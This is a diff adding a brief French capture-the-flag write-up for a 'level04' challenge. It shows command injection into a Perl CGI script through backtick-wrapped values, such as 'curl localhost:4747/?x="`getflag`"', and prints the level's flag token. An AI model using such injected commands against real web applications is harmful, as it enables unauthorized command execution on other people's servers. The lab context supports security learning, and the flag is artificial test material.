@@ -1,0 +1,8 @@
+en regardant dans le fichier level04,pl, on realise qu'il y a un site web auquel on peut acceder a localhost:4747,
+et aussi importan on peut surcharger la fonction x dans le script perl avec
+perl level04.pl x="`echo 42`"
+Le meme script perl est aussi present dans les dossiers apache du serveur et,
+par chancei il est execute au ancement du site, on peu dont le surcharger et avoir le resultat avec un curl:
+curl localhost:4747/?x="`getflag`"
+token level 04 => ne2searoevaevoem4ov4ar8ap
+
